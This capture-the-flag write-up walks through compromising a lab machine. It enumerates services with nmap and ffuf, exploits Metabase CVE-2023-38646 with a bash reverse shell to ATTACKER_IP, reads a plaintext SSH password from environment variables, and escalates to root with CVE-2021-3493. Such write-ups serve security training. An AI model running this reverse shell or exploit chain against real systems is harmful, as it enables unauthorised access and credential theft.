Start with Nmap scan

Command

```
/opt/mycustomscript/autonmapscan.sh

Enter the target IP address: 10.10.11.233
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-23 15:30 CST
Pre-scan script results:
|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)
Nmap scan report for 10.10.11.233
Host is up, received user-set (0.036s latency).

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

 Visiting the webpage, it redirects us to `http://analytical.htb/`. 

 We then need to add the `http://analytical.htb/` to our `/etc/hosts`

```
10.10.11.233 analytical.htb
```

Then by visiting `http://analytical.htb/` we should be able to see the page now.

There is not much that we can navigate on the page. 

There are name of people that might be a username

```
Jonnhy Smith
Alex Kirigo
Daniel Walker
due@analytical.com
```

We can keep this in our back pocket for now.

We will now fuzz the page.

We will use the tool `ffuf` 

Command:

`ffuf -u http://analytical.htb/FUZZ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt`

Result:

```
images                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 38ms]                                                                                                          
css                     [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 37ms]                                                                                                          
js                      [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 44ms]
```

Seems pretty standard, we will lso do a subdomain fuzz and see if there is something useful.

Command:

`ffuf -H "Host: FUZZ.analytical.htb" -u http://analytical.htb/ -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 154`

Result:

```
data                    [Status: 200, Size: 77858, Words: 3574, Lines: 28, Duration: 132ms]
```

We can see that there is a `http://data.analytical.htb/`, we will then add this to our host file.

We can now acess the page and gave us a login for Metabase

![image](https://github.com/L43371/Write-up/assets/129752764/b839bf28-daee-4d74-9df7-643bcb4aa484)

We can see that there is a recent vulnerability on Metabase **CVE 2023-38646**

`python3 main.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f│OLDPWD=/usr
 -c "bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1"

 We should be able to get a shell.

 Now we will run the command `env` , this will print the list of environment variables.

```
SHELL=/bin/sh                                                                                                                                                                                 
MB_DB_PASS=                                                                                                                                                                                   
HOSTNAME=e17988f13adc                                                                                                                                                                         
LANGUAGE=en_US:en                                                                                                                                                                             
MB_JETTY_HOST=0.0.0.0                                                                                                                                                                         
JAVA_HOME=/opt/java/openjdk                                                                                                                                                                   
MB_DB_FILE=//metabase.db/metabase.db                                                                                                                                                          
PWD=/                                                                                                                                                                                         
LOGNAME=metabase                                                                                                                                                                              
MB_EMAIL_SMTP_USERNAME=                                                                                                                                                                       
HOME=/home/metabase                                                                                                                                                                           
LANG=en_US.UTF-8                                                                                                                                                                              
META_USER=metalytics                                                                                                                                                                          
META_PASS=An4lytics_ds20223#                                                                                                                                                                  
MB_EMAIL_SMTP_PASSWORD=                                                                                                                                                                       
USER=metabase                                                                                                                                                                                 
SHLVL=4                                                                                                                                                                                       
MB_DB_USER=                                                                                                                                                                                   
FC_LANG=en-US                                                                                                                                                                                 
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib                                                                                                   
LC_CTYPE=en_US.UTF-8                                                                                                                                                                          
MB_LDAP_BIND_DN=                                                                                                                                                                              
LC_ALL=en_US.UTF-8                                                                                                                                                                            
MB_LDAP_PASSWORD=                                                                                                                                                                             
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                       
MB_DB_CONNECTION_URI=                                                                                                                                                                         
JAVA_VERSION=jdk-11.0.19+7                                                                                                                                                                    
_=/usr/bin/env              
```

The user `metalytics` credential was exposed, we will try to ssh using this credential.

and it works. We will now use the exploit CVE-2021-3493.

We will download the `exploit.c` file to our machine and compile it then transfer it to the victim's machine and when running it. We should receive a root shell.

Success!

```
metalytics@analytics:/tmp$ ./exploit                                                                                                                                                          
bash-5.1# whoami                                                                                                                                                                              
root
```
